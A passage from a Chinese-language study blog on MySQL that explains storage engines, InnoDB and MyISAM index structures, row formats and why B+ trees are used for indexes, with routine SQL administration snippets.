<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询 </span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;innodb_buffer_pool_instances&#x27;</span></span><br><span class="line"><span class="comment">-- 设置</span></span><br><span class="line">[server]</span><br><span class="line">innodb_buffer_pool_instances <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"><span class="comment">-- 每个缓冲池的大小是总共的大小除以实例的个数</span></span><br></pre></td></tr></table></figure>


<h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p><strong>存储引擎实际上指的就是表的类型</strong></p>
<h3 id="查看存储引擎"><a href="#查看存储引擎" class="headerlink" title="查看存储引擎"></a>查看存储引擎</h3><p>1、查看系统提供的所有存储引擎</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> engines;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">show</span> engines \G;</span><br></pre></td></tr></table></figure>

<p>2、 查看系统默认存储引擎<br><strong>默认使用 InnoDB 作为表的存储引擎（MySQL&gt;&#x3D;5.5）</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%storage_engine%&#x27;</span>;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@default_storage_engine</span>;</span><br></pre></td></tr></table></figure>

<p>3、修改系统默认存储引擎</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> DEFAULT_STORAGE_ENGINE<span class="operator">=</span>MyISAM;</span><br><span class="line"><span class="comment">-- 或修改配置文件my.conf</span></span><br><span class="line"><span class="keyword">default</span><span class="operator">-</span>storage<span class="operator">-</span>engine<span class="operator">=</span>MyISAM</span><br><span class="line"><span class="comment">-- 重启服务</span></span><br><span class="line">systemctl restart mysqld.service</span><br></pre></td></tr></table></figure>

<h3 id="设置表的存储引擎"><a href="#设置表的存储引擎" class="headerlink" title="设置表的存储引擎"></a>设置表的存储引擎</h3><p>1、创建表时指定，不指定使用默认</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 表名(</span><br><span class="line">建表语句;</span><br><span class="line">) ENGINE <span class="operator">=</span> 存储引擎名称;</span><br></pre></td></tr></table></figure>

<p>2、修改表的存储引擎</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 ENGINE <span class="operator">=</span> 存储引擎名称;</span><br></pre></td></tr></table></figure>


<h3 id="引擎介绍"><a href="#引擎介绍" class="headerlink" title="引擎介绍"></a>引擎介绍</h3><h4 id="【重要】InnoDB-引擎：具备外键支持功能的事务存储引擎"><a href="#【重要】InnoDB-引擎：具备外键支持功能的事务存储引擎" class="headerlink" title="【重要】InnoDB 引擎：具备外键支持功能的事务存储引擎"></a>【重要】InnoDB 引擎：具备外键支持功能的事务存储引擎</h4><p><strong>相对MyISAM处理效率差，内存要求高</strong></p>
<ul>
<li>MySQL&gt;&#x3D;5.5时默认采用此引擎</li>
<li>MySQL的<code>默认事务型引擎</code>，它被设计用来处理大量的短期(short-lived)事务。可以确保事务的完整提交(Commit)和回滚(Rollback)。</li>
<li>除了增加和查询外，还需要<code>更新、删除</code>操作，应<code>优先选择</code>InnoDB存储引擎。</li>
<li><strong>除非有非常特别的原因需要使用其他的存储引擎，否则应该优先考虑InnoDB引擎。</strong></li>
<li>数据文件结构：（参考<code>MySQL数据目录</code>）<ul>
<li>表名.frm 存储表结构（MySQL8.0时，合并在表名.ibd中）</li>
<li>表名.ibd 存储数据和索引</li>
</ul>
</li>
<li>InnoDB是<strong>为处理巨大数据量的最大性能设计</strong> 。<blockquote>
<p>在以前的版本中，字典数据以元数据文件、非事务表等来存储。现在这些元数据文件被删除了。比如： .frm ， .par ， .trn ， .isl ， .db.opt 等都在MySQL8.0中不存在了。</p>
</blockquote>
</li>
<li>对比MyISAM的存储引擎， InnoDB写的<strong>处理效率差</strong>一些 ，并且会占用更多的磁盘空间以保存数据和索引。</li>
<li>MyISAM只缓存索引，不缓存真实数据；InnoDB不仅缓存索引还要缓存真实数据，对<strong>内存要求较高</strong>，而且内存大小对性能有决定性的影响。</li>
</ul>
<h4 id="【重要】MyISAM-引擎：主要的非事务处理存储引擎"><a href="#【重要】MyISAM-引擎：主要的非事务处理存储引擎" class="headerlink" title="【重要】MyISAM 引擎：主要的非事务处理存储引擎"></a>【重要】MyISAM 引擎：主要的非事务处理存储引擎</h4><p><strong>相对InnoDB 不支持事务、行级锁、外键，崩溃后无法安全恢复</strong></p>
<ul>
<li>MySQL5.5之前默认的存储引擎</li>
<li>MyISAM提供了大量的特性，包括全文索引、压缩、空间函数(GIS)等，但MyISAM<code>不支持事务、行级锁、外键</code>，有一个毫无疑问的缺陷就是<code>崩溃后无法安全恢复</code>。</li>
<li>优势是访问的速度快 ，对事务完整性没有要求或者以SELECT、INSERT为主的应用</li>
<li>针对数据统计有额外的常数存储。故而<code>count(*) 的查询效率很高</code></li>
<li>数据文件结构：（参考<code>MySQL数据目录</code>）<ul>
<li>表名.frm 存储表结构</li>
<li>表名.MYD 存储数据 (MYData)</li>
<li>表名.MYI 存储索引 (MYIndex)</li>
</ul>
</li>
<li>应用场景：<code>只读应用或者以读为主的业务</code></li>
</ul>
<h4 id="【了解】Archive-引擎：用于数据存档"><a href="#【了解】Archive-引擎：用于数据存档" class="headerlink" title="【了解】Archive 引擎：用于数据存档"></a>【了解】Archive 引擎：用于数据存档</h4><ul>
<li>仅支持<code>插入和查询</code>功能，插入后不可更改；<code>插入效率高而查询较差</code></li>
<li>5.5后支持索引</li>
<li>使用<code>zlib压缩库</code>，常用作仓库使用</li>
<li>使用<code>行级锁</code>；支持<code>AUTO_INCREMENT</code>列属性，此列可具体唯一或非唯一索引</li>
<li>会创建以表名为名称，后缀为<code>.ARZ</code>的文件</li>
<li><strong>适合存储日志和数据采集；适合存储大量的独立的作为历史记录的数据；</strong><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240907164038.png"></li>
</ul>
<h4 id="【了解】CSV-引擎：存储数据时，以逗号分隔各个数据项"><a href="#【了解】CSV-引擎：存储数据时，以逗号分隔各个数据项" class="headerlink" title="【了解】CSV 引擎：存储数据时，以逗号分隔各个数据项"></a>【了解】CSV 引擎：存储数据时，以逗号分隔各个数据项</h4><ul>
<li><strong>可以将普通CSV文件作为MySQL的表处理</strong></li>
<li>可以作为一种<strong>数据交换机制</strong>，非常有用</li>
<li>存储的数据的文件以<code>.CSV</code>为后缀，可以直接在操作系统中通过文本编辑器等读取</li>
<li>对数据的<code>快速导入导出</code>有明显优势</li>
<li><code>不能有空列</code></li>
</ul>
<h4 id="【了解】Memory-引擎：置于内存的表"><a href="#【了解】Memory-引擎：置于内存的表" class="headerlink" title="【了解】Memory 引擎：置于内存的表"></a>【了解】Memory 引擎：置于内存的表</h4><p>Memory采用的逻辑介质是<code>内存</code>，<code>响应速度很快</code>，但是当mysqld守护进程崩溃的时候<code>数据会丢失</code>。另外，要求存储的数据是数据长度不变的格式，比如，Blob和Text类型的数据不可用(长度不固定的)</p>
<p>!Memory<a href="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240907165524.png"></a></p>
<h4 id="Blackhole、Merge、NDB、Federated"><a href="#Blackhole、Merge、NDB、Federated" class="headerlink" title="Blackhole、Merge、NDB、Federated"></a>Blackhole、Merge、NDB、Federated</h4><ol>
<li><code>Blackhole</code>引擎：丢弃写操作，读操作会返回空内容</li>
<li><code>Merge</code>引擎：管理多个MyISAM表构成的表集合</li>
<li><code>NDB</code>引擎：MySQL集群专用存储引擎<blockquote>
<p>也叫做 NDB Cluster 存储引擎，主要用于<code>MySQL Cluster分布式集群</code>环境，类似于Oracle的RAC集群。</p>
</blockquote>
</li>
<li><code>Federated</code>引擎：访问远程表<blockquote>
<p>Federated引擎是访问其他MySQL服务器的一个<code>代理</code> ，尽管该引擎看起来提供了一种很好的<code>跨服务器</code>的灵活性 ，但也经常带来问题，因此<code>默认是禁用的</code></p>
</blockquote>
</li>
</ol>
<h3 id="【重要】InnoDB合MyISAM对比"><a href="#【重要】InnoDB合MyISAM对比" class="headerlink" title="【重要】InnoDB合MyISAM对比"></a>【重要】InnoDB合MyISAM对比</h3><table>
<thead>
<tr>
<th>特点</th>
<th>MyISAM</th>
<th>InnoDB</th>
<th>MEMORY</th>
<th>MERGE</th>
<th>NDB</th>
</tr>
</thead>
<tbody><tr>
<td>存储限制</td>
<td>有</td>
<td>64TB</td>
<td>有</td>
<td>没有</td>
<td>有</td>
</tr>
<tr>
<td><strong>事务安全</strong></td>
<td></td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><strong>锁机制</strong></td>
<td>表锁，即使操作一条记录也会锁住整个表不适合高并发的操作</td>
<td>行锁，操作时只锁某一行<br>不对其它行有影响，适合高并发的操作</td>
<td>表锁</td>
<td>表锁</td>
<td>行锁</td>
</tr>
<tr>
<td>B树索引</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>哈希索引</td>
<td></td>
<td></td>
<td>支持</td>
<td></td>
<td>支持</td>
</tr>
<tr>
<td>全文索引</td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>集群索引</td>
<td></td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>数据缓存</td>
<td></td>
<td>支持</td>
<td>支持</td>
<td></td>
<td>支持</td>
</tr>
<tr>
<td>索引缓存</td>
<td>只缓存索引，不缓存真实数据</td>
<td>不仅缓存索引还要缓存真实数据<br>对内存要求较高，而且内存大小对性能有决定性的影响</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>数据可压缩</td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>空间使用</td>
<td>低</td>
<td>高</td>
<td>N&#x2F;A</td>
<td>低</td>
<td>低</td>
</tr>
<tr>
<td>内存使用</td>
<td>低</td>
<td>高</td>
<td>中等</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>批量插入的速度</td>
<td>高</td>
<td>低</td>
<td>高</td>
<td>高</td>
<td>高</td>
</tr>
<tr>
<td><strong>支持外键</strong></td>
<td></td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240907180553.png" alt="对比"></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="索引和调优"><a href="#索引和调优" class="headerlink" title="索引和调优"></a>索引和调优</h1><p><strong>提高数据库并发访问的效率，首先考虑优化SQL和索引，然后是使用缓存的策略，最后才是数据库采用主从架构实现读写分离。</strong>如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241210211128.png"></p>
<h2 id="索引的数据结构"><a href="#索引的数据结构" class="headerlink" title="索引的数据结构"></a>索引的数据结构</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><strong>定义</strong>：<br>索引（Index）是帮助MySQL高效获取数据的数据结构。<code>本质是一种数据结构</code>。你可以简单理解为”排好序的快速查找数据结构”，满足特定查找算法。这些数据结构以某种方式指向数据， 这样就可以在这些数据结构的基础上实现<code>高级查找算法</code>。</p>
<p><strong>优点</strong></p>
<ol>
<li>提高数据检索的效率，降低<code>数据库的IO成本</code>，这也是创建索引最主要的原因。 </li>
<li>通过创建唯一索引，可以保证数据库表中每一行<code>数据的唯一性</code>。</li>
<li>在实现数据的参考完整性方面，<code>可以加速表和表之间的连接</code>。换句话说，对于有依赖关系的子表和父表联合查询时，可以提高查询速度。 </li>
<li>在使用分组和排序子句进行数据查询时，可以显著<code>减少查询中分组和排序的时间</code>，降低了CPU的消耗。</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li><code>创建索引和维护索引要耗费时间</code>，并且随着数据量的增加，所耗费的时间也会增加。 </li>
<li>索引需要占<code>磁盘空间</code> ，除了数据表占数据空间之外，每一个索引还要占一定的物理空间， 存储在磁盘上 ，如果有大量的索引，索引文件就可能比数据文件更快达到最大文件尺寸。</li>
<li>虽然索引大大提高了查询速度，同时却会<code>降低更新表的速度</code>。当对表中的数据进行增加、删除和修改的时候，索引也要动态地维护，这样就降低了数据的维护速度。</li>
</ol>
<p><strong>索引可以提高查询的效率，但会降低插入效率，因此当插入大量数据时，应当先删除索引，插入数据后再重新创建索引</strong></p>
<h3 id="设计索引"><a href="#设计索引" class="headerlink" title="设计索引"></a>设计索引</h3><p>InnoDB存储引擎<code>每次从磁盘中读取数据到内存中的基本单位是页(16KB)</code>（不是最小单位）</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240913120933.png" alt="单个数据页示例"></p>
<p>当单个数据页无法存放所有数据时，就需要分配新的数据页，而新分配的<code>数据页编号</code>可能并<code>不是连续的</code>，只是通过链表连接.</p>
<blockquote>
<p>InnoDB将表空间划分为多个连续的区，每个区默认由64个页组成。这种分配方式意味着数据页在物理上是按区为单位进行分配的，而不是单个页。因此，当需要新的数据页时，InnoDB可能会分配整个区，而不是单个页，这会导致页编号的跳跃。随着数据的插入、删除和更新，表空间中的某些区可能会变得碎片化，即数据页不是连续存储的。为了优化存储效率和性能，InnoDB可能会通过合并碎片区或重新分配空间来减少碎片化。这种操作也会影响到数据页的编号连续性。</p>
</blockquote>
<p>在根据某个搜索条件查找一些记录时可能要遍历所有的数据页，因为各个页中的记录并没有规律，我们并不知道我们的搜索条件匹配哪些页中的记录，所以不得不依次遍历所有的数据页。</p>
<p>如果我们 <code>想快速的定位到需要查找的记录在哪些数据页</code><br>可以为快速定位记录所在的数据页而 <code>建立一个目录</code> ，建这个目录必须完成下边这些事:</p>
<ol>
<li>下一个数据页中用户记录的主键值必须大于上一个页中用户记录的主键值。（添加数据时也必须按顺序）</li>
<li>给所有的页建立一个目录项。</li>
</ol>
<p><strong>实际上相当于给数据存在顺序的链表建一个索引</strong></p>
<h3 id="常见的索引概念"><a href="#常见的索引概念" class="headerlink" title="常见的索引概念"></a>常见的索引概念</h3><h4 id="聚簇索引"><a href="#聚簇索引" class="headerlink" title="聚簇索引"></a>聚簇索引</h4><p><strong>聚簇索引只有搜索条件是主键时才能发挥作用</strong><br>聚簇索引并不是一种单独的索引类型，而是一种<code>数据存储方式</code>（所有的用户记录全部存储在叶子结点，也就是所谓的<code>索引即数据，数据即索引。</code>（数据页中存储的可能是索引也可能是数据）聚簇即指数据行合相邻的键值聚簇的存储在一起</p>
<p><strong>特点：</strong></p>
<ol>
<li><p>使用记录主键值的大小进行记录和页的排序，这包括三个方面的含义：</p>
<ul>
<li><code>页内</code>的记录是按照主键的大小顺序排成一个<code>单向链表</code> 。</li>
<li>各个存放<code>用户记录的页</code>也是根据页中用户记录的主键大小顺序排成一个<code>双向链表</code>。</li>
<li>存放<code>目录项记录的页</code>分为不同的层次，在同一层次中的页也是根据页中目录项记录的主键大小顺序排成一个<code>双向链表</code>。</li>
</ul>
</li>
<li><p>B+树的<code>叶子节点</code>存储的是<code>完整的用户记录</code>。</p>
<blockquote>
<p>完整的用户记录，就是指这个记录中存储了所有列的值（包括隐藏列）。</p>
</blockquote>
</li>
</ol>
<p><strong>InnoDB中会自动创建聚簇索引，不需要显示创建</strong></p>
<p><strong>优点：</strong></p>
<ol>
<li><code>数据访问更快</code>，因为聚簇索引将索引和数据保存在同一个B+树中，因此从聚簇索引中获取数据比非聚簇索引更快(不需要回表)</li>
<li>聚簇索引对于主键的<code>排序查找</code>和<code>范围查找</code>速度非常快</li>
<li>按照聚簇索引排列顺序，查询显示一定范围数据的时候，由于数据都是紧密相连，数据库不用从多个数据块中提取数据，所以<code>节省了大量的io操作</code>。</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li><code>插入速度严重依赖于插入顺序</code>，按照主键的顺序插入是最快的方式，否则将会出现页分裂，严重影响性能。因此，对于InnoDB表，我们一般都会定义一个<code>自增的ID列为主键</code></li>
<li><code>更新主键的代价很高</code>，因为将会导致被更新的行移动。因此，对于InnoDB表，我们<code>一般定义主键为不可更新</code></li>
<li><code>二级索引访问需要两次索引查找</code>，第一次找到主键值，第二次根据主键值找到行数据</li>
</ol>
<p><strong>限制</strong></p>
<ol>
<li>MyISAM不支持</li>
<li>一个表只能有一个聚簇索引，一般就是主键</li>
<li>没有主键就使用<code>非空且唯一</code>的列作为索引，也没有就隐式定义一个主键</li>
<li>主键列应当尽可能选用有序的顺序id</li>
</ol>
<h4 id="二级索引（非聚簇索引、辅助索引）"><a href="#二级索引（非聚簇索引、辅助索引）" class="headerlink" title="二级索引（非聚簇索引、辅助索引）"></a>二级索引（非聚簇索引、辅助索引）</h4><p><strong>使用其他列作为搜索条件时，可以使用二级索引</strong>。通过建立多棵B+树，不同树中的数据采用不同的排序规则，如树1采用列1的数据大小构建，叶子结点只存储列1的数据。这种B+树和上文的聚簇索引B+树存在以下不同</p>
<ol>
<li><p>使用记录某列(设为C2)的大小进行记录和页的排序，这包括三个方面的含义：</p>
<ul>
<li><code>页内</code>的记录是按照C2的大小顺序排成一个<code>单向链表</code> 。</li>
<li>各个存放<code>用户记录的页</code>也是根据页中用户记录的C2列大小顺序排成一个<code>双向链表</code>。</li>
<li>存放<code>目录项记录的页</code>分为不同的层次，在同一层次中的页也是根据页中目录项记录的C2列大小顺序排成一个<code>双向链表</code>。</li>
</ul>
</li>
<li><p>B+树的<code>叶子节点</code>存储的<code>不是完整的用户记录</code>,而是<code>C2列+页号</code>。</p>
<blockquote>
<p>完整的用户记录，就是指这个记录中存储了所有列的值（包括隐藏列）。</p>
</blockquote>
</li>
</ol>
<p>我们根据这个以某列(C2)大小排序的B+树只能确定我们要查找记录的主键值，所以如果我们想根据某列(C2)的值查找到完整的用户记录的话，仍然需要到<code>聚簇索引</code>中再查一遍，这个过程称为<code>回表</code>。也就是根据c2列的值查询一条完整的用户记录需要使用到2棵B+树.<br>查找过程：</p>
<ol>
<li>根据根页面，快速定位到目录项记录所在的页的页号（可能需要两层）</li>
<li>通过目录项记录确定用户记录真实所在的页</li>
<li>到真实存储用户记录的页中找到具体记录</li>
<li>这棵非聚簇索引B+树的具体记录中只存储了c2列的数据和主键列（或聚簇索引依赖的其他列）的数据，因此还需要根据主键值查找聚簇索引，重复1~3.</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>InnoDB中一个表中<code>只能有一个聚簇索引</code>，<code>多个</code>依赖其他字段构建的<code>二级索引</code></p>
<p>聚簇索引和二级索引的区别：</p>
<ol>
<li>聚簇索引叶子节点存储的就是<code>数据记录</code>，非聚簇索引存储的是<code>数据位置</code>（由依赖列和主键列构成）</li>
<li>聚簇索引会<code>影响</code>数据表的<code>物理存储顺序</code>，非聚簇索引不影响</li>
<li>一个表<code>只能有一个聚簇索引</code>（只能有一种顺序存储方式），<code>可以有多个非聚簇索引</code></li>
<li>聚簇索引的<code>查询效率高</code>，但插入删除等<code>更新</code>操作<code>效率低</code>(针对的是索引对应的B+树的更新和查询，不是实际数据的更新查询，因为实际数据更新不可避免地需要修改各B+树。每次更新，聚簇索引都需要更改；而非聚簇索引的B+树不一定被修改，因为其对应列数据不一定发生变化。)</li>
</ol>
<p>聚簇索引是主键对应的 或 没有主键时非空唯一列对应的 或 都没有时隐式定义的主键列对应的 索引</p>
<h4 id="联合索引（非聚簇索引的一种）"><a href="#联合索引（非聚簇索引的一种）" class="headerlink" title="联合索引（非聚簇索引的一种）"></a>联合索引（非聚簇索引的一种）</h4><p>可以同时<code>以多个列</code>的大小作为排序规则，也就是同时为多个列建立索引，比方说我们想让B+树按照c2和c3列的大小进行排序，这个包含两层含义：</p>
<ol>
<li>先把各个记录和页按照c2列进行排序。</li>
<li>在记录的c2列相同的情况下，采用c3列进行排序<br> 注意一点，以c2和c3列的大小为排序规则建立的B+树称为<code>联合索引</code>，本质上也是一个二级索引。它的意思与分别为c2和c3列分别建立索引的表述是不同的，不同点如下：</li>
<li>建立<code>联合索引</code>只会建立如上图一样的1棵B+树。</li>
<li>为c2和c3列分别建立索引会分别以c2和c3列的大小为排序规则建立2棵B+树。</li>
</ol>
<h3 id="InnoDB的索引方案"><a href="#InnoDB的索引方案" class="headerlink" title="InnoDB的索引方案"></a>InnoDB的索引方案</h3><p>数据索引存储在同一文件，参见&lt;MySQL架构-Linux中的MySQL的数据目录-InnoDB&gt;</p>
<p><a href="https://xiaolincoding.com/mysql/base/row_format.html#innodb-%E8%A1%8C%E6%A0%BC%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B">参考资料-小林coding-行格式</a></p>
<p>每一数据页中的数据就是很多行构成的，每一行数据都有存储数据的格式，叫做<code>行格式</code></p>
<p>InnoDB 提供了 4 种行格式，分别是<code>Redundant</code>、<code>Compact</code>、<code>Dynamic</code>和<code>Compressed</code>行格式。<br>Redundant 是很古老的行格式了， MySQL 5.0 版本之前用的行格式，现在基本没人用了。由于 Redundant 不是一种紧凑的行格式，所以 MySQL 5.0 之后引入了 Compact 行记录存储方式，Compact 是一种紧凑的行格式，设计的初衷就是为了让一个数据页中可以存放更多的行记录，从 MySQL 5.1 版本之后，行格式默认设置成 Compact。Dynamic 和 Compressed 两个都是紧凑的行格式，它们的行格式都和 Compact 差不多，因为都是基于 Compact 改进一点东西。从 MySQL5.7 版本之后，默认使用 Dynamic 行格式。</p>
<h4 id="Compact行格式"><a href="#Compact行格式" class="headerlink" title="Compact行格式"></a>Compact行格式</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/COMPACT.drawio.webp"></p>
<p>一条完整的记录分为「记录的额外信息」和「记录的真实数据」两个部分。</p>
<ol>
<li>记录的额外信息:分为三部分<ol>
<li>变长字段长度列表：存储varchar(n)等类型变长数据的设计长度，只有存在变长数据时才有此字段。按列顺序逆序存放（提高cache命中率），如第一列变长实际长1字节，第二列3字节，则存放时为03 01，</li>
<li>NULL 值列表：NULL是不会存放在行格式中记录的真实数据部分里的，而是存储在此字段中，只有存在允许为NULL的列时才有此字段，同样按列顺序逆序存放（提高cache命中率）。用一个bit表示某个允许NULL值的列，当其值为0时表示不为NULL，为1表示为NULL;NULL 值列表必须用整数个字节的位，因此允许为NULL的列不足8的整数倍数时，使用0填充高位。如三列可为NULL，只有2，3列为NULL，则存储为0000 0110.</li>
<li>记录头信息：通常包括delete_mask(标记此记录是否被删除)；next_record(下一条记录位置（可见通过链表组织）)；<code>recode_type</code>(当前记录的类型，0表示普通记录，1表示B+树非叶子节点记录，2表示最小记录（头），3表示最大记录（尾）)等</li>
</ol>
</li>
<li>记录的真实数据：除了我们定义的字段，还有三个隐藏字段，分别为：<ol>
<li>row_id：占6字节，非必需，建表时没有指定主键或唯一约束列就hi有此字段</li>
<li>trx_id：占6字节，必需，事务id，表示生成此条数据的事务</li>
<li>roll_pointer：7字节，必需，记录上一个版本的指针</li>
</ol>
</li>
</ol>
<h4 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240914144049.png"><br>通过如上的方法，当数据页足够多时，就会形成<code>B+树</code><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240914144142.png"><br><code>B+树</code>一般不超过4层，因为每个数据页为64KB，每个代表目录页的数据页可以存放1000条数据，假设每个数据页能存放100条数据，那四层<code>B+树</code>就能存放<code>100*1000*1000*1000</code>即<code>一千亿</code>条数据，足够存放大多数数据库的数据了。<br><strong>因此精确查找最多只需要查找4次</strong></p>
<h4 id="InnoDB的B-索引补充"><a href="#InnoDB的B-索引补充" class="headerlink" title="InnoDB的B+索引补充"></a>InnoDB的B+索引补充</h4><ol>
<li><code>根结点页面永远是根节点页面，与表同生共死</code>。创建索引时并不是自底向上的，而是在用户创建表时，自动创建一个B+树聚簇索引，构建一个根节点页面，没有插入数据时，B+树索引对应的根节点中既没有用户记录也没有目录项记录；当插入数据时，先把此根节点存储满；满后将记录全部复制到新分配的页，然后再开一个新页存储新插入的数据，根节点就记录这两个数据页的目录项，根节点是二层中的最高层；直到满时，再重复操作，根结点成为三层中的最高层。</li>
<li><code>内节点中目录项的唯一性</code>。内节点中目录项记录的内容是<code>索引列+页号</code>的搭配，二层索引还会有<code>主键列</code>。因为二层索引的索引列数据可能相同，两页的索引列可能相同。（这也是为什么主键不可过长的原因）</li>
<li><code>一个页至少要存储两条数据记录</code></li>
</ol>
<h3 id="MyISAM的索引方案"><a href="#MyISAM的索引方案" class="headerlink" title="MyISAM的索引方案"></a>MyISAM的索引方案</h3><p>数据索引分开存储，参见&lt;MySQL架构-Linux中的MySQL的数据目录-MyISAM&gt;</p>
<ol>
<li>MyISAM中的所有索引都是非聚簇索引</li>
<li>用户<code>记录按照插入的顺序</code>单独存储在一个文件(数据文件)中</li>
<li>索引信息存储到另一个文件(索引文件)中，会为<code>主键</code>创建一个<code>索引</code>，其叶子存储<code>主键值+数据记录地址</code></li>
<li>必须进行一次回表操作，但回表操作十分迅速，因为是直接按地址查找的</li>
<li>MyISAM可以没有主键，也不会隐式生成</li>
</ol>
<h3 id="索引的代价"><a href="#索引的代价" class="headerlink" title="索引的代价"></a>索引的代价</h3><ol>
<li><code>占用空间</code></li>
<li><code>增删改等更新操作维护索引需要花费时间</code></li>
</ol>
<h2 id="为什么选择B-树作为索引"><a href="#为什么选择B-树作为索引" class="headerlink" title="为什么选择B+树作为索引"></a>为什么选择B+树作为索引</h2><p>磁盘的I&#x2F;O操作是影响MySQL查询效率的关键，创建索引主要目的就是为了降低磁盘I&#x2F;O的操作次数。以下逐个数据结构和算法分析为什么选择B+树。</p>
<h3 id="全表遍历"><a href="#全表遍历" class="headerlink" title="全表遍历"></a>全表遍历</h3><p>显然效率极差</p>
<h3 id="哈希结构"><a href="#哈希结构" class="headerlink" title="哈希结构"></a>哈希结构</h3><p>Memory存储引擎支持此种索引方式。这种索引方式适合键值型数据库，如<code>redis</code>存储的核心就是哈希表</p>
<ol>
<li>哈希索引仅能满足&#x3D;、&lt;&gt;、IN查询，当进行范围查询是，时间复杂度会退化到O(n),而数能保持O(log2n)</li>
<li>哈希数据的存储时没有顺序的，不利于<code>ORDER BY</code></li>
<li>对于联合索引，哈希值是将联合索引键合并后计算的，无法单独对一个或几个索引键进行查询</li>
<li>对于等值查询，通常情况下哈希索引效率更高，但如果索引列的重复值很多，效率会降低。</li>
</ol>
<h4 id="自适应哈希索引"><a href="#自适应哈希索引" class="headerlink" title="自适应哈希索引"></a>自适应哈希索引</h4><p>InnoDB的自适应哈希索引（Adaptive Hash Index，简称AHI）是InnoDB存储引擎特有的一项关键特性，旨在提升查询性能和数据库的整体性能。</p>
<p>自适应哈希索引是InnoDB存储引擎为了优化某些热点数据的查询性能而自动构建的一种内存中的哈希索引结构。它不同于传统的哈希索引，因为它是自动和动态的。InnoDB会根据查询模式和数据访问频率自动决定是否构建哈希索引，并且会根据数据的变化和查询模式的变化动态地调整哈希索引。</p>
<p>具体来说，当InnoDB注意到某些索引值被频繁地以等值查询的方式访问时，它会在内存中为这些值建立哈希索引，从而加速后续的等值查询。这个过程是自动的，不需要用户干预。自适应哈希索引是通过缓冲池的B+树页构造而来，因此建立的速度很快，而且不需要对整张表构建哈希索引，只是对热点页建立哈希索引。</p>
<h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>二叉搜索树在一些情况下会退化成链表，严重降低查询性能，因此引入<code>二叉平衡树</code>AVL树</p>
<h4 id="AVL树"><a href="#AVL树" class="headerlink" title="AVL树"></a>AVL树</h4><p>这是一颗空树或者其左右子树的高度差的绝对值不超过1，并且左右子树均是平衡二叉树。常见的平衡二叉树包括平衡二叉搜索树、红黑树、大小堆、伸展树等。</p>
<p>平衡二叉搜索树的搜索时间复杂度为O(log2n)</p>
<h4 id="B-balance-树（多路平衡查找树）"><a href="#B-balance-树（多路平衡查找树）" class="headerlink" title="B(balance)树（多路平衡查找树）"></a>B(balance)树（多路平衡查找树）</h4><p>B树是一种自平衡的树状数据结构，能够对存储的数据进行O(log n)的时间复杂度进行查找、插入和删除。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/image-20241029210111120.png"></p>
<p><strong>特性</strong></p>
<ul>
<li>一个m阶的B树，每个节点最多可以有m个子节点，且每个节点至少有ceil(m&#x2F;2)个子节点（除了根节点和叶子节点外）。对于根节点，其子树个数范围为[2, m]，节点内值的个数范围为[1, m-1]。</li>
<li><strong>自平衡性</strong>：B树通过一系列的插入和删除操作保持树的平衡，确保所有叶子节点都位于同一深度。这种平衡性使得从根节点到任何叶子节点的路径长度相同，从而保证了查找、插入和删除操作的高效性。</li>
<li><strong>有序性</strong>：B树中的节点关键字都是有序的，这有助于在查找过程中快速定位数据。具体来说，每个节点的关键字都是递增排列的，且子节点的关键字值分布在父节点的关键字之间。</li>
<li><strong>节点分裂与合并</strong>：当节点因插入操作而变满时，会进行分裂操作，将节点中的部分关键字和子树分配给新的节点，并在父节点中插入新的关键字以维持树的平衡。同样地，在删除操作中，如果节点中的关键字数量过少，可能会通过合并相邻节点或重新平衡树来保持树的性质。</li>
</ul>
